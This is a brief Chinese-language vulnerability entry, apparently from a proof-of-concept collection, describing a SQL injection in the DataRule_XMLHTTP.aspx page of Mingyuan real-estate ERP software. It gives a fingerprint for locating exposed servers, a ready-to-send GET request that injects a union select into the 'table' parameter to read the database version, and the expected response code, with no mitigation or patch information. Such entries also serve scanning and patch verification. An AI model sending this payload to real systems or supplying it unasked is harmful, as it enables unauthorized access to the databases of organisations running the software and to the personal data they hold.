# 明源地产ERPDataRule_XMLHTTP.aspx存在SQL注入漏洞

明源地产 ｜ SQL注入 ｜ —
- **指纹**：`body="/_common/scripts/md5-min.js"`
- **请求**：`GET /BUAdjust/DataRule/DataRule_XMLHTTP.aspx/?ywtype=getFieldXML&table=-1%27%20union%20select%20@@version-- HTTP/1.1`
- **响应特征**：200